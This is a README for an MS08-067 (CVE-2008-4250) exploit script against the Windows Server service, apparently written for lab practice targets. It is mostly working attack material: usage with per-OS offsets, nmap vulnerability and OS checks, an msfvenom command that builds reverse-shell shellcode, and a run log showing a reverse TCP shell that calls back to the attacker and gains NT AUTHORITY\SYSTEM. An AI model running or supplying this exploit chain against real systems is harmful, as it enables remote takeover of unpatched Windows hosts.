# CVE-2008-4250

## Summary

The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a crafted RPC request that triggers the overflow during path canonicalization, as exploited in the wild by Gimmiv.A in October 2008, aka "Server Service Vulnerability." 

## ms08_067_netapi.py

My version of the exploit code. No need to start listener manually or generate shellcode manually just point and go.
Just still need to provide the correct offset as argument to the script.

## Dependencies

msfconsole
msfvenom

## Usage

```sh
# ./ms08_067_netapi.py

 ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄
▐░░▌     ▐░░▌▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█░█▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌
▐░▌▐░▌ ▐░▌▐░▌▐░▌          ▐░▌▐░▌    ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌                   ▐░▌
▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄▄▄         ▐░▌
▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌ ▐░░░░░░░░░▌ ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌       ▐░▌
▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀█░▌      ▐░▌
▐░▌       ▐░▌          ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌     ▐░▌
▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄█░▌    ▐░▌
▐░▌       ▐░▌▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌   ▐░▌
 ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀     ▀

  *~ OFFSET ~*
  [1] Windows XP SP0/SP1 Universal
  [2] Windows 2000 Universal (port:139,445)
  [3] Windows 2003 SP0 Universal
  [4] Windows 2003 SP1 English
  [5] Windows XP SP3 French (NX)
  [6] Windows XP SP3 English (NX)
  [7] Windows XP SP3 English (AlwaysOn NX)

[nighter@nighter.se] - CVE-2008-4250

Usage: ./ms08_067_netapi.py <HOST>:<PORT> <LHOST> <LPORT> [1-7]

EXAMPLE: ./ms08_067_netapi.py '10.10.10.70' check
EXAMPLE: ./ms08_067_netapi.py '10.10.10.70' vuln
EXAMPLE: ./ms08_067_netapi.py '10.10.10.70:445' 10.10.14.24 1337 1

```

## Check if server is vulnerable

```sh
 ./ms08_067_netapi.py 10.11.1.xxx vuln
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 07:55 EST
Nmap scan report for 10.11.1.227
Host is up (0.091s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:50:56:B8:67:4D (VMware)

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
```

## Check offset to use.

Here you can find what OS version is run to know what offset to use as argument to the script.

```sh
./ms08_067_netapi.py 10.11.1.xxx check
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 07:56 EST
Nmap scan report for 10.11.1.227
Host is up (0.091s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:50:56:B8:67:4D (VMware)

Host script results:
| smb-os-discovery:
|   OS: Windows 2000 (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_2000::-
|   Computer name: xxx
|   NetBIOS computer name: xxx\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-02-25T14:42:25+02:00

Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds
```


## Run exploit

```sh
./ms08_067_netapi.py 10.11.1.xxx:139 10.11.0.xxx 4444 2
[+] Start listener
[+] Build shellcode
PAYLOAD => windows/shell_reverse_tcp
LHOST => 10.11.0.xxx
LPORT => 4444
[*] Started reverse TCP handler on 10.11.0.xxx:4444
[+] Exploit
Windows 2000 Universal

[+]Initiating connection
[-]connected to ncacn_np:10.11.1.227[\pipe\browser]
[*] Command shell session 1 opened (10.11.0.xxx:4444 -> 10.11.1.xxx:1072) at 2019-02-25 08:06:18 -0500

[*] Done

C:\WINNT\system32>whoami
whoami
NT AUTHORITY\SYSTEM
```

# Manual solution with legacy exploit code.

## ms08_067_2018.py

This is the code PoC have improved. If you would like to use the original exploit you use this methology.

## Generating Shellcode

Just execute and paste into exploit code.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

Also: nmap has a good OS discovery script that pairs well with this exploit:

```sh
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
```

## Usage

```sh
./ms08_067_2018.py xx.xx.xx.xx 1 445
```

## Metasploit

```sh
msfconsole -r ms08_067_netapi.rc
```
